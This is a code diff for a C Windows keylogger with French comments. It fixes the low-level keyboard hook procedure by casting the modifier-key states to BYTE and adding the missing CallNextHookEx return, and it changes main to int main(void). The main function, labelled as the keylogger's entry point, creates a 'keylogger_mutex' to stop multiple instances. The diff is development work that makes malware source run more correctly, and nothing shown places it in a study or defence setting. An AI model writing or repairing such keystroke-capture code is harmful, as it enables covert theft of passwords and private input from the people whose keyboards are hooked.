@@ -67,10 +67,10 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             GetKeyboardState(keyboardState);
 
             // MAJ de l'état des modificateurs spécifiques pour le hook global
-            keyboardState[VK_SHIFT] = GetKeyState(VK_SHIFT) & 0x8000;
-            keyboardState[VK_CAPITAL] = GetKeyState(VK_CAPITAL) & 0x0001;
-            keyboardState[VK_CONTROL] = GetKeyState(VK_CONTROL) & 0x8000;
-            keyboardState[VK_MENU] = GetKeyState(VK_MENU) & 0x8000;
+            keyboardState[VK_SHIFT] = (BYTE)(GetKeyState(VK_SHIFT) & 0x8000);
+            keyboardState[VK_CAPITAL] = (BYTE)(GetKeyState(VK_CAPITAL) & 0x0001);
+            keyboardState[VK_CONTROL] = (BYTE)(GetKeyState(VK_CONTROL) & 0x8000);
+            keyboardState[VK_MENU] = (BYTE)(GetKeyState(VK_MENU) & 0x8000);
 
             // Récupération de la locale du processus au premier plan
             HKL keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL));
@@ -85,9 +85,10 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             }
         }
     }
+    return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
-int main() {
+int main(void) {
     // 1. Empêcher l'exécution multiple du Keylogger
     HANDLE handle_mutex = CreateMutex(NULL, TRUE, "keylogger_mutex");
     if (GetLastError() == ERROR_ALREADY_EXISTS) {
